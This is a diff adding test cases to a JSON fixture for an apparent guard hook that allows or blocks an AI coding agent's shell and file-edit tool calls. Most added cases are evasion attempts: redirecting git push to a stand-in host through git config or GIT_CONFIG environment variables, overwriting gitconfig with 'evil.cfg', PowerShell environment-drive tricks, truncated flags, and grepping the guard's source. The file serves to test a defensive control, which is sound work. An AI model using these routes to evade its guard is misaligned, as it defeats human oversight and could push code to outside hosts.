@@ -1408,7 +1408,649 @@
   "role": "owner",
   "tool": "Bash",
   "command": "git push -u upstream feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push -u Origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push -uq origin feature/x",
   "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push --dry-run --atomic origin feature/x",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push -o origin https://example.invalid/r.git feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push --repo origin https://example.invalid/r.git feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push --receive-pack origin https://example.invalid/r.git feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "git push --push-option origin https://example.invalid/r.git feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push --delet origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push --no-verif origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config get remote.origin.url",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config list --show-origin",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config set remote.origin.pushurl https://example.invalid/r.git",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config set url.https://example.invalid/.pushInsteadOf https://github.com/",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --file other.cfg remote.origin.pushurl https://example.invalid/r.git",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config edit",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --edit",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --rename-section remote.origin remote.gone",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config remove-section remote.origin",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "cat ~/.gitconfig",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "echo '[remote \"origin\"]' >> ~/.gitconfig",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "cp evil.cfg ~/.config/git/config",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Edit",
+  "file": "~/.gitconfig",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Write",
+  "file": "~/.config/git/config",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://example.invalid/r.git git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://example.invalid/r.git git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://example.invalid/r.git; git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "GIT_CONFIG_GLOBAL=/tmp/other.gitconfig git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "echo $GIT_CONFIG_COUNT",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "$env:GIT_CONFIG_COUNT=1; $env:GIT_CONFIG_KEY_0='remote.origin.pushurl'; $env:GIT_CONFIG_VALUE_0='https://example.invalid/r.git'; git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Item env:GIT_CONFIG_COUNT 1; git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git commit -m \"Document GIT_CONFIG_COUNT=1 behaviour\"",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git commit -m \"Document the GIT_CONFIG_COUNT behaviour\"",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git commit -F message.txt",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "printf '%s\n' GIT_CONFIG_COUNT",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "read -p GIT_CONFIG_COUNT REPLY",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "cmd /c \"set GIT_CONFIG_PARAMETERS='remote.origin.pushurl=https://example.invalid/r.git'&&git push origin topic\"",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "cmd /c \"setx GIT_CONFIG_GLOBAL C:\\x.cfg\"",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "$env:KDF_TMP = 'x'; Copy-Item Env:KDF_TMP Env:GIT_CONFIG_PARAMETERS; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Rename-Item env:KDF_TMP -NewName GIT_CONFIG_PARAMETERS; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "env -S '\"GIT_CONFIG_COUNT=1\"\n\"GIT_CONFIG_KEY_0=remote.origin.pushurl\"\ngit push origin topic'",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "set -a; let 'GIT_CONFIG_COUNT = 1'",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "set -a; printf -v GIT_CONFIG_COUNT 1; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "set -a; read -a GIT_CONFIG_COUNT <<< 1; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Item Environment::GIT_CONFIG_PARAMETERS 'x'; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Item Microsoft.PowerShell.Core\\Environment::GIT_CONFIG_COUNT 1; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Rename-Item Environment::KDF_TMP -NewName GIT_CONFIG_PARAMETERS; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Rename-Item README.md -NewName GIT_CONFIG.md",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "cp README.md GIT_CONFIG.md",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "set -- GIT_CONFIG_COUNT",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "[[ $GIT_CONFIG_COUNT == 1 ]]",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git grep 'GIT_CONFIG_COUNT == 1'",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "[ \"$GIT_CONFIG_COUNT\" != 1 ]",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "cmd /c 'set \"GIT_CONFIG_GLOBAL==push.conf\" & git push origin topic'",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "cmd /c \"set GIT_CONFIG_GLOBAL==push.conf&&git push origin topic\"",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Copy-Item Environment::GIT_CONFIG_GLOBAL Environment::KDF_BACKUP",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Copy-Item Env:KDF_TMP Env:GIT_CONFIG_PARAMETERS -ErrorAction Stop; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Copy-Item -Dest Env:GIT_CONFIG_PARAMETERS -Path Env:KDF_TMP; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Location -ErrorAction Stop Env:; Set-Item GIT_CONFIG_PARAMETERS x; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Location -Path:Env:; Set-Item GIT_CONFIG_PARAMETERS x; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Location Env:; Get-Item GIT_CONFIG_COUNT",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Get-Item Env:GIT_CONFIG_COUNT",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Write-Output $env:GIT_CONFIG_GLOBAL; cp a.txt b.txt",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Write-Output ${env:GIT_CONFIG_GLOBAL}; cp a.txt b.txt",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "New-PSDrive -Name KdfEnv -PSProvider Environment -Root ''; Set-Item KdfEnv:GIT_CONFIG_COUNT 1; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "powershell -Command \"New-PSDrive -Name KdfEnv -PSProvider Environment -Root ''; Set-Item KdfEnv:GIT_CONFIG_COUNT 1\"; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "ndr KdfEnv Environment ''",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "powershell -NoProfile -Command \"New-Object PSObject -Property @{PSProvider='Environment'} | mount -Name KdfEnv -Root ''\nSet-Item KdfEnv:GIT_CONFIG_COUNT 1\ngit push origin topic\"",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "$ExecutionContext.SessionState.Drive.New($d, 'global'); Set-Item KdfEnv:GIT_CONFIG_COUNT 1",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git grep -n -e SetEnvironmentVariable -e GIT_CONFIG -- tools/claude-code/kdf-guard.js",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "$ExecutionContext.SessionState.Drive.'New'($d, 'global'); Set-Item KdfEnv:GIT_CONFIG_PARAMETERS 'x'",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "$ExecutionContext.SessionState.Drive. New($d, 'global'); Set-Item KdfEnv:GIT_CONFIG_PARAMETERS 'x'",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "$d = New-Object System.Management.Automation.PSDriveInfo 'KdfEnv', (Get-PSProvider Environment), '', '', $null; Set-Item KdfEnv:GIT_CONFIG_COUNT 1",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "New-PSDrive -Name Proj -PSProvider FileSystem -Root C:/work",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "New-PSDrive -Name KdfEnv `\n  -PSProvider Environment -Root ''\nSet-Item KdfEnv:GIT_CONFIG_COUNT 1\ngit push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "powershell -Command \"New-PSDrive -Name KdfEnv `\n -PSProvider Environment -Root ''; Set-Item KdfEnv:GIT_CONFIG_COUNT 1\"; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Item ([string]{Env:GIT_CONFIG_COUNT}) 1; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "New-PSDrive -Name Proj -PSProvider FileSystem -Root C:/work/environments",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "mount /dev/sdb1 /mnt/environments",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "[Environment]::SetEnvironmentVariable(\n  ('GIT_CONFIG_PARAMETERS'),\n  \"'remote.origin.pushurl=https://example.invalid/r.git'\"\n)\ngit push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "[Environment]::SetEnvironmentVariable([string]'GIT_CONFIG_COUNT', '1'); git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git commit -m \"Document environment mount\"",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "mount KdfEnv Environment ''; Set-Item KdfEnv:GIT_CONFIG_COUNT 1",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "[Environment]::GetEnvironmentVariable('GIT_CONFIG_GLOBAL')",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "git grep -n \"Set-Item Env:GIT_CONFIG\" -- tools/claude-code",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Copy-Item Env:KDF_TMP -Destination Env:GIT_CONFIG_PARAMETERS; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Location Env:; Set-Item GIT_CONFIG_COUNT 1; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "cd Environment::; New-Item GIT_CONFIG_GLOBAL -Value x; git push origin topic",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Location Env:; Get-ChildItem",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Write-Output $env:GIT_CONFIG_COUNT",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Get-Item env:GIT_CONFIG_GLOBAL",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --file ~/.gitconfig --get user.name",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config get --file ~/.gitconfig user.name",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git push --no-progress origin feature/x",
+  "expect": "allow"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "Set-Item env:'GIT_CONFIG_COUNT' 1; Set-Item env:'GIT_CONFIG_KEY_0' remote.origin.pushurl; Set-Item env:'GIT_CONFIG_VALUE_0' https://example.invalid/r.git; git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "${env:GIT_CONFIG_COUNT} = 1; git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "PowerShell",
+  "command": "[Environment]::SetEnvironmentVariable('GIT_CONFIG_COUNT', '1'); git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "env \"GIT_CONFIG_COUNT\"=1 git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "set -a; read GIT_CONFIG_COUNT <<< 1; git push -u origin feature/x",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "env \"A=1\" git push origin main",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "env \"A=1\" gh pr merge 5",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "sudo \"A=1\" git push origin main",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --rename-sect guardtmp remote.origin",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --edi",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "git config --remove-sect remote.origin",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Bash",
+  "command": "printf x >> ~/.config/git/./config",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Edit",
+  "file": "~/./.gitconfig",
+  "expect": "block"
+ },
+ {
+  "role": "owner",
+  "tool": "Edit",
+  "file": "C:/Program Files/Git/etc/gitconfig",
+  "expect": "block"
  },
  {
   "role": "owner",
